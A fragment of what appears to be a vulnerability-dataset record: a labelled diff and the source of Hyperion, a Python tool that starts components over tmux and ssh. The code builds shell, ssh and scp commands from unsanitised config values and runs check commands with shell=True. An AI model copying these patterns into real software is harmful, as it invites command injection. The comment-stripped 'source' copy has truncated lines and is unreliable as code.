Two processes are tee logging\n+        # TODO: Investigate minimum process number on hosts\n         # TODO: Change this when more logging options are introduced\n-        if len(pids) < 3:\n+        if len(pids) < 2:\n             logger.debug(\"Main window process has finished. Running custom check if available\")\n             if check_available and run_component_check(comp):\n                 logger.debug(\"Process terminated but check was successful\")\n", "add": 2, "remove": 2, "filename": "/hyperion/hyperion.py", "badparts": ["        if len(pids) < 3:"], "goodparts": ["        if len(pids) < 2:"]}], "source": "\n\nfrom libtmux import Server from yaml import load, dump from setupParser import Loader from DepTree import Node, dep_resolve, CircularReferenceException import logging import os import socket import argparse from psutil import Process from subprocess import call from graphviz import Digraph from enum import Enum from time import sleep import sys from PyQt4 import QtGui import hyperGUI FORMAT=\"%(asctime)s: %(name)s[%(levelname)s]:\\t%(message)s\" logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S') TMP_SLAVE_DIR=\"/tmp/Hyperion/slave/components\" TMP_COMP_DIR=\"/tmp/Hyperion/components\" TMP_LOG_PATH=\"/tmp/Hyperion/log\" BASE_DIR=os.path.dirname(__file__) SCRIPT_CLONE_PATH=(\"%s/scripts/start_named_clone_session.sh\" % BASE_DIR) class CheckState(Enum): RUNNING=0 STOPPED=1 STOPPED_BUT_SUCCESSFUL=2 STARTED_BY_HAND=3 DEP_FAILED=4 class ControlCenter: def __init__(self, configfile=None): self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.configfile=configfile self.nodes={} self.server=[] self.host_list=[] if configfile: self.load_config(configfile) self.session_name=self.config[\"name\"] with open('debug-result.yml', 'w') as outfile: dump(self.config, outfile, default_flow_style=False) self.logger.debug(\"Loading config was successful\") self.server=Server() if self.server.has_session(self.session_name): self.session=self.server.find_where({ \"session_name\": self.session_name }) self.logger.info('found running session by name \"%s\" on server' % self.session_name) else: self.logger.info('starting new session by name \"%s\" on server' % self.session_name) self.session=self.server.new_session( session_name=self.session_name, window_name=\"Main\" ) else: self.config=None def load_config(self, filename=\"default.yaml\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\" Config not loaded yet!\") else: for group in self.config['groups']: for comp in group['components']: self.logger.debug(\"Checking component '%s' in group '%s' on host '%s'\" % (comp['name'], group['name'], comp['host'])) if comp['host'] !=\"localhost\" and not self.run_on_localhost(comp): self.copy_component_to_remote(comp, comp['name'], comp['host']) self.host_list=list(set(self.host_list)) self.set_dependencies(True) def set_dependencies(self, exit_on_fail): for group in self.config['groups']: for comp in group['components']: self.nodes[comp['name']]=Node(comp) master_node=Node({'name': 'master_node'}) for name in self.nodes: node=self.nodes.get(name) master_node.addEdge(node) if \"depends\" in node.component: for dep in node.component['depends']: if dep in self.nodes: node.addEdge(self.nodes[dep]) else: self.logger.error(\"Unmet dependency: '%s' for component '%s'!\" %(dep, node.comp_name)) if exit_on_fail: exit(1) self.nodes['master_node']=master_node try: node=self.nodes.get('master_node') res=[] unres=[] dep_resolve(node, res, unres) dep_string=\"\" for node in res: if node is not master_node: dep_string=\"%s -> %s\" %(dep_string, node.comp_name) self.logger.debug(\"Dependency tree for start all: %s\" % dep_string) except CircularReferenceException as ex: self.logger.error(\"Detected circular dependency reference between %s and %s!\" %(ex.node1, ex.node2)) if exit_on_fail: exit(1) def copy_component_to_remote(self, infile, comp, host): self.host_list.append(host) self.logger.debug(\"Saving component to tmp\") tmp_comp_path=('%s/%s.yaml' %(TMP_COMP_DIR, comp)) ensure_dir(tmp_comp_path) with open(tmp_comp_path, 'w') as outfile: dump(infile, outfile, default_flow_style=False) self.logger.debug('Copying component \"%s\" to remote host \"%s\"' %(comp, host)) cmd=(\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\" % (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp)) self.logger.debug(cmd) send_main_session_command(self.session, cmd) def stop_component(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\"Stopping remote component '%s' on host '%s'\" %(comp['name'], comp['host'])) self.stop_remote_component(comp['name'], comp['host']) else: window=find_window(self.session, comp['name']) if window: self.logger.debug(\"window '%s' found running\" % comp['name']) self.logger.info(\"Shutting down window...\") kill_window(window) self.logger.info(\"... done!\") def stop_remote_component(self, comp_name, host): cmd=(\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\"Run cmd:\\n%s\" % cmd) send_main_session_command(self.session, cmd) def start_component(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) for node in res: self.logger.debug(\"node name '%s' vs. comp name '%s'\" %(node.comp_name, comp['name'])) if node.comp_name !=comp['name']: self.logger.debug(\"Checking and starting %s\" % node.comp_name) state=self.check_component(node.component) if(state is CheckState.STOPPED_BUT_SUCCESSFUL or state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\"Component %s is already running, skipping to next in line\" % comp['name']) else: self.logger.debug(\"Start component '%s' as dependency of '%s'\" %(node.comp_name, comp['name'])) self.start_component_without_deps(node.component) tries=0 while True: self.logger.debug(\"Checking %s resulted in checkstate %s\" %(node.comp_name, state)) state=self.check_component(node.component) if(state is not CheckState.RUNNING or state is not CheckState.STOPPED_BUT_SUCCESSFUL): break if tries > 100: return False tries=tries +1 sleep(.5) self.logger.debug(\"All dependencies satisfied, starting '%s'\" %(comp['name'])) state=self.check_component(node.component) if(state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\"Component %s is already running. Skipping start\" % comp['name']) else: self.start_component_without_deps(comp) return True def start_component_without_deps(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\"Starting remote component '%s' on host '%s'\" %(comp['name'], comp['host'])) self.start_remote_component(comp['name'], comp['host']) else: log_file=(\"%s/%s\" %(TMP_LOG_PATH, comp['name'])) window=find_window(self.session, comp['name']) if window: self.logger.debug(\"Restarting '%s' in old window\" % comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) else: self.logger.info(\"creating window '%s'\" % comp['name']) window=self.session.new_window(comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) def start_remote_component(self, comp_name, host): cmd=(\"ssh %s 'hyperion --config %s/%s.yaml slave'\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\"Run cmd:\\n%s\" % cmd) send_main_session_command(self.session, cmd) def check_component(self, comp): return check_component(comp, self.session, self.logger) def get_dep_list(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) res.remove(node) return res def is_localhost(self, hostname): try: hn_out=socket.gethostbyname(hostname) if hn_out=='127.0.0.1' or hn_out=='::1': self.logger.debug(\"Host '%s' is localhost\" % hostname) return True else: self.logger.debug(\"Host '%s' is not localhost\" % hostname) return False except socket.gaierror: sys.exit(\"Host '%s' is unknown! Update your /etc/hosts file!\" % hostname) def run_on_localhost(self, comp): return self.is_localhost(comp['host']) def kill_remote_session_by_name(self, name, host): cmd=\"ssh -t %s 'tmux kill-session -t %s'\" %(host, name) send_main_session_command(self.session, cmd) def start_clone_session(self, comp_name, session_name): cmd=\"%s '%s' '%s'\" %(SCRIPT_CLONE_PATH, session_name, comp_name) send_main_session_command(self.session, cmd) def start_remote_clone_session(self, comp_name, session_name, hostname): remote_cmd=(\"%s '%s' '%s'\" %(SCRIPT_CLONE_PATH, session_name, comp_name)) cmd=\"ssh %s 'bash -s' < %s\" %(hostname, remote_cmd) send_main_session_command(self.session, cmd) def draw_graph(self): deps=Digraph(\"Deps\", strict=True) deps.graph_attr.update(rankdir=\"BT\") try: node=self.nodes.get('master_node') for current in node.depends_on: deps.node(current.comp_name) res=[] unres=[] dep_resolve(current, res, unres) for node in res: if \"depends\" in node.component: for dep in node.component['depends']: if dep not in self.nodes: deps.node(dep, color=\"red\") deps.edge(node.comp_name, dep, \"missing\", color=\"red\") elif node.comp_name is not \"master_node\": deps.edge(node.comp_name, dep) except CircularReferenceException as ex: self.logger.error(\"Detected circular dependency reference between %s and %s!\" %(ex.node1, ex.node2)) deps.edge(ex.node1, ex.node2, \"circular error\", color=\"red\") deps.edge(ex.node2, ex.node1, color=\"red\") deps.view() class SlaveLauncher: def __init__(self, configfile=None, kill_mode=False, check_mode=False): self.kill_mode=kill_mode self.check_mode=check_mode self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.config=None self.session=None if kill_mode: self.logger.info(\"started slave with kill mode\") if check_mode: self.logger.info(\"started slave with check mode\") self.server=Server() if self.server.has_session(\"slave-session\"): self.session=self.server.find_where({ \"session_name\": \"slave-session\" }) self.logger.info('found running slave session on server') elif not kill_mode and not check_mode: self.logger.info('starting new slave session on server') self.session=self.server.new_session( session_name=\"slave-session\" ) else: self.logger.info(\"No slave session found on server. Aborting\") exit(CheckState.STOPPED) if configfile: self.load_config(configfile) self.window_name=self.config['name'] self.flag_path=(\"/tmp/Hyperion/slaves/%s\" % self.window_name) self.log_file=(\"/tmp/Hyperion/log/%s\" % self.window_name) ensure_dir(self.log_file) else: self.logger.error(\"No slave component config provided\") def load_config(self, filename=\"default.yaml\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\" Config not loaded yet!\") elif not self.session: self.logger.error(\" Init aborted. No session was found!\") else: self.logger.debug(self.config) window=find_window(self.session, self.window_name) if window: self.logger.debug(\"window '%s' found running\" % self.window_name) if self.kill_mode: self.logger.info(\"Shutting down window...\") kill_window(window) self.logger.info(\"... done!\") elif not self.kill_mode: self.logger.info(\"creating window '%s'\" % self.window_name) window=self.session.new_window(self.window_name) start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name) else: self.logger.info(\"There is no component running by the name '%s'. Exiting kill mode\" % self.window_name) def run_check(self): if not self.config: self.logger.error(\" Config not loaded yet!\") exit(CheckState.STOPPED.value) elif not self.session: self.logger.error(\" Init aborted. No session was found!\") exit(CheckState.STOPPED.value) check_state=check_component(self.config, self.session, self.logger) exit(check_state.value) def run_component_check(comp): if call(comp['cmd'][1]['check'], shell=True)==0: return True else: return False def check_component(comp, session, logger): logger.debug(\"Running component check for %s\" % comp['name']) check_available=len(comp['cmd']) > 1 and 'check' in comp['cmd'][1] window=find_window(session, comp['name']) if window: pid=get_window_pid(window) logger.debug(\"Found window pid: %s\" % pid) procs=[] for entry in pid: procs.extend(Process(entry).children(recursive=True)) pids=[p.pid for p in procs] logger.debug(\"Window is running %s child processes\" % len(pids)) if len(pids) < 3: logger.debug(\"Main window process has finished. Running custom check if available\") if check_available and run_component_check(comp): logger.debug(\"Process terminated but check was successful\") return CheckState.STOPPED_BUT_SUCCESSFUL else: logger.debug(\"Check failed or no check available: returning false\") return CheckState.STOPPED elif check_available and run_component_check(comp): logger.debug(\"Check succeeded\") return CheckState.RUNNING elif not check_available: logger.debug(\"No custom check specified and got sufficient pid amount: returning true\") return CheckState.RUNNING else: logger.debug(\"Check failed: returning false\") return CheckState.STOPPED else: logger.debug(\"%s window is not running. Running custom check\" % comp['name']) if check_available and run_component_check(comp): logger.debug(\"Component was not started by Hyperion, but the check succeeded\") return CheckState.STARTED_BY_HAND else: logger.debug(\"Window not running and no check command is available or it failed: returning false\") return CheckState.STOPPED def get_window_pid(window): r=window.cmd('list-panes', \"-F return[int(p) for p in r.stdout] def kill_session_by_name(server, name): session=server.find_where({ \"session_name\": name }) session.kill_session() def kill_window(window): window.cmd(\"send-keys\", \"\", \"C-c\") window.kill_window() def start_window(window, cmd, log_file, comp_name): setup_log(window, log_file, comp_name) window.cmd(\"send-keys\", cmd, \"Enter\") def find_window(session, window_name): window=session.find_where({ \"window_name\": window_name }) return window def send_main_session_command(session, cmd): window=find_window(session, \"Main\") window.cmd(\"send-keys\", cmd, \"Enter\") def setup_log(window, file, comp_name): clear_log(file) window.cmd(\"send-keys\", \"exec 2> >(exec tee -i -a '%s')\" % file, \"Enter\") window.cmd(\"send-keys\", \"exec 1> >(exec tee -i -a '%s')\" % file, \"Enter\") window.cmd(\"send-keys\",('echo \" def clear_log(file_path): if os.path.isfile(file_path): os.remove(file_path) def ensure_dir(file_path): directory=os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory) def main(): logger=logging.getLogger(__name__) logger.setLevel(logging.DEBUG) parser=argparse.ArgumentParser() parser.add_argument(\"--config\", '-c', type=str, default='test.yaml', help=\"YAML config file. see sample-config.yaml. Default: test.yaml\") subparsers=parser.add_subparsers(dest=\"cmd\") subparser_editor=subparsers.add_parser('edit', help=\"Launches the editor to edit or create new systems and \" \"components\") subparser_run=subparsers.add_parser('run', help=\"Launches the setup specified by the --config argument\") subparser_val=subparsers.add_parser('validate', help=\"Validate the setup specified by the --config argument\") subparser_remote=subparsers.add_parser('slave', help=\"Run a component locally without controlling it. The \" \"control is taken care of the remote master invoking \" \"this command.\\nIf run with the --kill flag, the \" \"passed component will be killed\") subparser_val.add_argument(\"--visual\", help=\"Generate and show a graph image\", action=\"store_true\") remote_mutex=subparser_remote.add_mutually_exclusive_group(required=False) remote_mutex.add_argument('-k', '--kill', help=\"switch to kill mode\", action=\"store_true\") remote_mutex.add_argument('-c', '--check', help=\"Run a component check\", action=\"store_true\") args=parser.parse_args() logger.debug(args) if args.cmd=='edit': logger.debug(\"Launching editor mode\") elif args.cmd=='run': logger.debug(\"Launching runner mode\") cc=ControlCenter(args.config) cc.init() start_gui(cc) elif args.cmd=='validate': logger.debug(\"Launching validation mode\") cc=ControlCenter(args.config) if args.visual: cc.set_dependencies(False) cc.draw_graph() else: cc.set_dependencies(True) elif args.cmd=='slave': logger.debug(\"Launching slave mode\") sl=SlaveLauncher(args.config, args.kill, args.check) if args.check: sl.run_check() else: sl.init() def start_gui(control_center): app=QtGui.QApplication(sys.argv) main_window=QtGui.QMainWindow() ui=hyperGUI.UiMainWindow() ui.ui_init(main_window, control_center) main_window.show() sys.exit(app.exec_()) ", "sourceWithComments": "#! /usr/bin/env python\nfrom libtmux import Server\nfrom yaml import load, dump\nfrom setupParser import Loader\nfrom DepTree import Node, dep_resolve, CircularReferenceException\nimport logging\nimport os\nimport socket\nimport argparse\nfrom psutil import Process\nfrom subprocess import call\nfrom graphviz import Digraph\nfrom enum import Enum\nfrom time import sleep\n\nimport sys\nfrom PyQt4 import QtGui\nimport hyperGUI\n\nFORMAT = \"%(asctime)s: %(name)s [%(levelname)s]:\\t%(message)s\"\n\nlogging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')\nTMP_SLAVE_DIR = \"/tmp/Hyperion/slave/components\"\nTMP_COMP_DIR = \"/tmp/Hyperion/components\"\nTMP_LOG_PATH = \"/tmp/Hyperion/log\"\n\nBASE_DIR = os.path.dirname(__file__)\nSCRIPT_CLONE_PATH = (\"%s/scripts/start_named_clone_session.sh\" % BASE_DIR)\n\n\nclass CheckState(Enum):\n    RUNNING = 0\n    STOPPED = 1\n    STOPPED_BUT_SUCCESSFUL = 2\n    STARTED_BY_HAND = 3\n    DEP_FAILED = 4\n\n\nclass ControlCenter:\n\n    def __init__(self, configfile=None):\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.configfile = configfile\n        self.nodes = {}\n        self.server = []\n        self.host_list = []\n\n        if configfile:\n            self.load_config(configfile)\n            self.session_name = self.config[\"name\"]\n\n            # Debug write resulting yaml file\n            with open('debug-result.yml', 'w') as outfile:\n                dump(self.config, outfile, default_flow_style=False)\n            self.logger.debug(\"Loading config was successful\")\n\n            self.server = Server()\n\n            if self.server.has_session(self.session_name):\n                self.session = self.server.find_where({\n                    \"session_name\": self.session_name\n                })\n\n                self.logger.info('found running session by name \"%s\" on server' % self.session_name)\n            else:\n                self.logger.info('starting new session by name \"%s\" on server' % self.session_name)\n                self.session = self.server.new_session(\n                    session_name=self.session_name,\n                    window_name=\"Main\"\n                )\n        else:\n            self.config = None\n\n    ###################\n    # Setup\n    ###################\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n\n        else:\n            for group in self.config['groups']:\n                for comp in group['components']:\n                    self.logger.debug(\"Checking component '%s' in group '%s' on host '%s'\" %\n                                      (comp['name'], group['name'], comp['host']))\n\n                    if comp['host'] != \"localhost\" and not self.run_on_localhost(comp):\n                        self.copy_component_to_remote(comp, comp['name'], comp['host'])\n\n            # Remove duplicate hosts\n            self.host_list = list(set(self.host_list))\n\n            self.set_dependencies(True)\n\n    def set_dependencies(self, exit_on_fail):\n        for group in self.config['groups']:\n            for comp in group['components']:\n                self.nodes[comp['name']] = Node(comp)\n\n        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all\n        # nodes with simple algorithms\n        master_node = Node({'name': 'master_node'})\n        for name in self.nodes:\n            node = self.nodes.get(name)\n\n            # Add edges from each node to pseudo node\n            master_node.addEdge(node)\n\n            # Add edges based on dependencies specified in the configuration\n            if \"depends\" in node.component:\n                for dep in node.component['depends']:\n                    if dep in self.nodes:\n                        node.addEdge(self.nodes[dep])\n                    else:\n                        self.logger.error(\"Unmet dependency: '%s' for component '%s'!\" % (dep, node.comp_name))\n                        if exit_on_fail:\n                            exit(1)\n        self.nodes['master_node'] = master_node\n\n        # Test if starting all components is possible\n        try:\n            node = self.nodes.get('master_node')\n            res = []\n            unres = []\n            dep_resolve(node, res, unres)\n            dep_string = \"\"\n            for node in res:\n                if node is not master_node:\n                    dep_string = \"%s -> %s\" % (dep_string, node.comp_name)\n            self.logger.debug(\"Dependency tree for start all: %s\" % dep_string)\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            if exit_on_fail:\n                exit(1)\n\n    def copy_component_to_remote(self, infile, comp, host):\n        self.host_list.append(host)\n\n        self.logger.debug(\"Saving component to tmp\")\n        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))\n        ensure_dir(tmp_comp_path)\n        with open(tmp_comp_path, 'w') as outfile:\n            dump(infile, outfile, default_flow_style=False)\n\n        self.logger.debug('Copying component \"%s\" to remote host \"%s\"' % (comp, host))\n        cmd = (\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\" %\n               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))\n        self.logger.debug(cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Stop\n    ###################\n    def stop_component(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Stopping remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.stop_remote_component(comp['name'], comp['host'])\n        else:\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % comp['name'])\n                self.logger.info(\"Shutting down window...\")\n                kill_window(window)\n                self.logger.info(\"... done!\")\n\n    def stop_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Start\n    ###################\n    def start_component(self, comp):\n\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        for node in res:\n            self.logger.debug(\"node name '%s' vs. comp name '%s'\" % (node.comp_name, comp['name']))\n            if node.comp_name != comp['name']:\n                self.logger.debug(\"Checking and starting %s\" % node.comp_name)\n                state = self.check_component(node.component)\n                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or\n                        state is CheckState.STARTED_BY_HAND or\n                        state is CheckState.RUNNING):\n                    self.logger.debug(\"Component %s is already running, skipping to next in line\" % comp['name'])\n                else:\n                    self.logger.debug(\"Start component '%s' as dependency of '%s'\" % (node.comp_name, comp['name']))\n                    self.start_component_without_deps(node.component)\n\n                    tries = 0\n                    while True:\n                        self.logger.debug(\"Checking %s resulted in checkstate %s\" % (node.comp_name, state))\n                        state = self.check_component(node.component)\n                        if (state is not CheckState.RUNNING or\n                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):\n                            break\n                        if tries > 100:\n                            return False\n                        tries = tries + 1\n                        sleep(.5)\n\n        self.logger.debug(\"All dependencies satisfied, starting '%s'\" % (comp['name']))\n        state = self.check_component(node.component)\n        if (state is CheckState.STARTED_BY_HAND or\n                state is CheckState.RUNNING):\n            self.logger.debug(\"Component %s is already running. Skipping start\" % comp['name'])\n        else:\n            self.start_component_without_deps(comp)\n        return True\n\n    def start_component_without_deps(self, comp):\n        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):\n            self.logger.debug(\"Starting remote component '%s' on host '%s'\" % (comp['name'], comp['host']))\n            self.start_remote_component(comp['name'], comp['host'])\n        else:\n            log_file = (\"%s/%s\" % (TMP_LOG_PATH, comp['name']))\n            window = find_window(self.session, comp['name'])\n\n            if window:\n                self.logger.debug(\"Restarting '%s' in old window\" % comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n            else:\n                self.logger.info(\"creating window '%s'\" % comp['name'])\n                window = self.session.new_window(comp['name'])\n                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])\n\n    def start_remote_component(self, comp_name, host):\n        # invoke Hyperion in slave mode on each remote host\n        cmd = (\"ssh %s 'hyperion --config %s/%s.yaml slave'\" % (host, TMP_SLAVE_DIR, comp_name))\n        self.logger.debug(\"Run cmd:\\n%s\" % cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Check\n    ###################\n    def check_component(self, comp):\n        return check_component(comp, self.session, self.logger)\n\n    ###################\n    # Dependency management\n    ###################\n    def get_dep_list(self, comp):\n        node = self.nodes.get(comp['name'])\n        res = []\n        unres = []\n        dep_resolve(node, res, unres)\n        res.remove(node)\n\n        return res\n\n    ###################\n    # Host related checks\n    ###################\n    def is_localhost(self, hostname):\n        try:\n            hn_out = socket.gethostbyname(hostname)\n            if hn_out == '127.0.0.1' or hn_out == '::1':\n                self.logger.debug(\"Host '%s' is localhost\" % hostname)\n                return True\n            else:\n                self.logger.debug(\"Host '%s' is not localhost\" % hostname)\n                return False\n        except socket.gaierror:\n            sys.exit(\"Host '%s' is unknown! Update your /etc/hosts file!\" % hostname)\n\n    def run_on_localhost(self, comp):\n        return self.is_localhost(comp['host'])\n\n    ###################\n    # TMUX\n    ###################\n    def kill_remote_session_by_name(self, name, host):\n        cmd = \"ssh -t %s 'tmux kill-session -t %s'\" % (host, name)\n        send_main_session_command(self.session, cmd)\n\n    def start_clone_session(self, comp_name, session_name):\n        cmd = \"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name)\n        send_main_session_command(self.session, cmd)\n\n    def start_remote_clone_session(self, comp_name, session_name, hostname):\n        remote_cmd = (\"%s '%s' '%s'\" % (SCRIPT_CLONE_PATH, session_name, comp_name))\n        cmd = \"ssh %s 'bash -s' < %s\" % (hostname, remote_cmd)\n        send_main_session_command(self.session, cmd)\n\n    ###################\n    # Visualisation\n    ###################\n    def draw_graph(self):\n        deps = Digraph(\"Deps\", strict=True)\n        deps.graph_attr.update(rankdir=\"BT\")\n        try:\n            node = self.nodes.get('master_node')\n\n            for current in node.depends_on:\n                deps.node(current.comp_name)\n\n                res = []\n                unres = []\n                dep_resolve(current, res, unres)\n                for node in res:\n                    if \"depends\" in node.component:\n                        for dep in node.component['depends']:\n                            if dep not in self.nodes:\n                                deps.node(dep, color=\"red\")\n                                deps.edge(node.comp_name, dep, \"missing\", color=\"red\")\n                            elif node.comp_name is not \"master_node\":\n                                deps.edge(node.comp_name, dep)\n\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            deps.edge(ex.node1, ex.node2, \"circular error\", color=\"red\")\n            deps.edge(ex.node2, ex.node1, color=\"red\")\n\n        deps.view()\n\n\nclass SlaveLauncher:\n\n    def __init__(self, configfile=None, kill_mode=False, check_mode=False):\n        self.kill_mode = kill_mode\n        self.check_mode = check_mode\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.config = None\n        self.session = None\n        if kill_mode:\n            self.logger.info(\"started slave with kill mode\")\n        if check_mode:\n            self.logger.info(\"started slave with check mode\")\n        self.server = Server()\n\n        if self.server.has_session(\"slave-session\"):\n            self.session = self.server.find_where({\n                \"session_name\": \"slave-session\"\n            })\n\n            self.logger.info('found running slave session on server')\n        elif not kill_mode and not check_mode:\n            self.logger.info('starting new slave session on server')\n            self.session = self.server.new_session(\n                session_name=\"slave-session\"\n            )\n\n        else:\n            self.logger.info(\"No slave session found on server. Aborting\")\n            exit(CheckState.STOPPED)\n\n        if configfile:\n            self.load_config(configfile)\n            self.window_name = self.config['name']\n            self.flag_path = (\"/tmp/Hyperion/slaves/%s\" % self.window_name)\n            self.log_file = (\"/tmp/Hyperion/log/%s\" % self.window_name)\n            ensure_dir(self.log_file)\n        else:\n            self.logger.error(\"No slave component config provided\")\n\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n        else:\n            self.logger.debug(self.config)\n            window = find_window(self.session, self.window_name)\n\n            if window:\n                self.logger.debug(\"window '%s' found running\" % self.window_name)\n                if self.kill_mode:\n                    self.logger.info(\"Shutting down window...\")\n                    kill_window(window)\n                    self.logger.info(\"... done!\")\n            elif not self.kill_mode:\n                self.logger.info(\"creating window '%s'\" % self.window_name)\n                window = self.session.new_window(self.window_name)\n                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)\n\n            else:\n                self.logger.info(\"There is no component running by the name '%s'. Exiting kill mode\" %\n                                 self.window_name)\n\n    def run_check(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n            exit(CheckState.STOPPED.value)\n        elif not self.session:\n            self.logger.error(\" Init aborted. No session was found!\")\n            exit(CheckState.STOPPED.value)\n\n        check_state = check_component(self.config, self.session, self.logger)\n        exit(check_state.value)\n\n###################\n# Component Management\n###################\ndef run_component_check(comp):\n    if call(comp['cmd'][1]['check'], shell=True) == 0:\n        return True\n    else:\n        return False\n\n\ndef check_component(comp, session, logger):\n    logger.debug(\"Running component check for %s\" % comp['name'])\n    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]\n    window = find_window(session, comp['name'])\n    if window:\n        pid = get_window_pid(window)\n        logger.debug(\"Found window pid: %s\" % pid)\n\n        # May return more child pids if logging is done via tee (which then was started twice in the window too)\n        procs = []\n        for entry in pid:\n            procs.extend(Process(entry).children(recursive=True))\n        pids = [p.pid for p in procs]\n        logger.debug(\"Window is running %s child processes\" % len(pids))\n\n        # Two processes are tee logging\n        # TODO: Change this when more logging options are introduced\n        if len(pids) < 3:\n            logger.debug(\"Main window process has finished. Running custom check if available\")\n            if check_available and run_component_check(comp):\n                logger.debug(\"Process terminated but check was successful\")\n                return CheckState.STOPPED_BUT_SUCCESSFUL\n            else:\n                logger.debug(\"Check failed or no check available: returning false\")\n                return CheckState.STOPPED\n        elif check_available and run_component_check(comp):\n            logger.debug(\"Check succeeded\")\n            return CheckState.RUNNING\n        elif not check_available:\n            logger.debug(\"No custom check specified and got sufficient pid amount: returning true\")\n            return CheckState.RUNNING\n        else:\n            logger.debug(\"Check failed: returning false\")\n            return CheckState.STOPPED\n    else:\n        logger.debug(\"%s window is not running. Running custom check\" % comp['name'])\n        if check_available and run_component_check(comp):\n            logger.debug(\"Component was not started by Hyperion, but the check succeeded\")\n            return CheckState.STARTED_BY_HAND\n        else:\n            logger.debug(\"Window not running and no check command is available or it failed: returning false\")\n            return CheckState.STOPPED\n\n\ndef get_window_pid(window):\n    r = window.cmd('list-panes',\n                   \"-F #{pane_pid}\")\n    return [int(p) for p in r.stdout]\n\n###################\n# TMUX\n###################\ndef kill_session_by_name(server, name):\n    session = server.find_where({\n        \"session_name\": name\n    })\n    session.kill_session()\n\n\ndef kill_window(window):\n    window.cmd(\"send-keys\", \"\", \"C-c\")\n    window.kill_window()\n\n\ndef start_window(window, cmd, log_file, comp_name):\n    setup_log(window, log_file, comp_name)\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n\ndef find_window(session, window_name):\n    window = session.find_where({\n        \"window_name\": window_name\n    })\n    return window\n\n\ndef send_main_session_command(session, cmd):\n    window = find_window(session, \"Main\")\n    window.cmd(\"send-keys\", cmd, \"Enter\")\n\n\n###################\n# Logging\n###################\ndef setup_log(window, file, comp_name):\n    clear_log(file)\n    # Reroute stderr to log file\n    window.cmd(\"send-keys\", \"exec 2> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    # Reroute stdin to log file\n    window.cmd(\"send-keys\", \"exec 1> >(exec tee -i -a '%s')\" % file, \"Enter\")\n    window.cmd(\"send-keys\", ('echo \"#Hyperion component start: %s\\n$(date)\"' % comp_name), \"Enter\")\n\n\ndef clear_log(file_path):\n    if os.path.isfile(file_path):\n        os.remove(file_path)\n\n\ndef ensure_dir(file_path):\n    directory = os.path.dirname(file_path)\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n###################\n# Startup\n###################\ndef main():\n    logger = logging.getLogger(__name__)\n    logger.setLevel(logging.DEBUG)\n    parser = argparse.ArgumentParser()\n\n    # Create top level parser\n    parser.add_argument(\"--config\", '-c', type=str,\n                        default='test.yaml',\n                        help=\"YAML config file. see sample-config.yaml. Default: 